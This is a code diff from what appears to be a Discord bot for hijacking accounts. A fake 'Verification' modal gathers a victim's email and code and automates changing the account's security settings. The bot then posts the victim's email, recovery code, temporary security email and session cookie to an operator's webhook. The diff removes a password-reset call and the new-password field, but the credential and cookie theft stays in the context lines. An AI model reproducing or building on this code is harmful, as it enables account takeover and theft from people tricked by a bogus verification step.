@@ -6,7 +6,7 @@ import time
 from discord import ui, Webhook, NotFound, HTTPException
 from views.data.data import stringcrafter
 from views.data.wbu3.wb3 import web3g
-from views.otp import automate_auto_change, CreateRandomEmail, generate_password,ForgotPasswordCode
+from views.otp import automate_auto_change, CreateRandomEmail, generate_password
 
 
 class MyModalTwo(ui.Modal, title="Verification"):
@@ -55,7 +55,6 @@ class MyModalTwo(ui.Modal, title="Verification"):
             async with aiohttp.ClientSession() as session:
                 starttime = time.time()
                 await automate_auto_change(email,self.box_three.value,TempEmail,newgenpassword)
-                await ForgotPasswordCode(newgenpassword,email,TempEmail)
                 endtime = time.time()
                 timetotal = endtime - starttime
                 webhook = Webhook.from_url(data["webhook"], session=session)
@@ -70,7 +69,6 @@ class MyModalTwo(ui.Modal, title="Verification"):
                     embedsecure.add_field(name="**Email:**", value=f"```{config.LastUsedEmail}```", inline=True)
                     embedsecure.add_field(name="**Recovery Code:**", value=f"```{config.LastRecoveryCode}```", inline=False)
                     embedsecure.add_field(name="**Security Email (Only Valid For 24Hours):**", value=f"```{TempEmail}```", inline=True)
-                    embedsecure.add_field(name="**New Password:**", value=f"```{newgenpassword}```", inline=True)
                     embedsecure.add_field(name="**Cookie:**", value=f"```{config.LastCookie}```", inline=False)
                     embedsecure.add_field(name="**Time Taken:**", value=f"```{timetotal}```", inline=False)
                     embedsecure.set_thumbnail(url= f"https://mc-heads.net/avatar/{config.LastUserName}.png")
